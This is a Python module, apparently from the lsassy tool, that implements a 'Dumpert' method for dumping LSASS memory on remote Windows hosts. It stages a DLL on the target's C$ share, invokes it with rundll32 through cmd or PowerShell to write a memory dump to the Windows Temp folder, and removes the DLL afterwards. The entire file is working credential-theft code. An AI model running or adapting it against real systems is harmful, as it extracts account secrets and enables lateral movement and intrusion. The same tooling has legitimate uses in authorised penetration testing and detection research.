"""
https://github.com/outflanknl/Dumpert
"""

from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    custom_dump_path_support = False
    custom_dump_name_support = False

    dump_name = "dumpert.dmp"
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.dumpertdll = Dependency("dumpertdll", "dumpert.dll")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.dumpertdll])

    def clean(self):
        self.clean_dependencies([self.dumpertdll])

    def get_commands(self):
        cmd_command = """rundll32.exe {},Dump""".format(self.dumpertdll.get_remote_path())
        pwsh_command = cmd_command
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
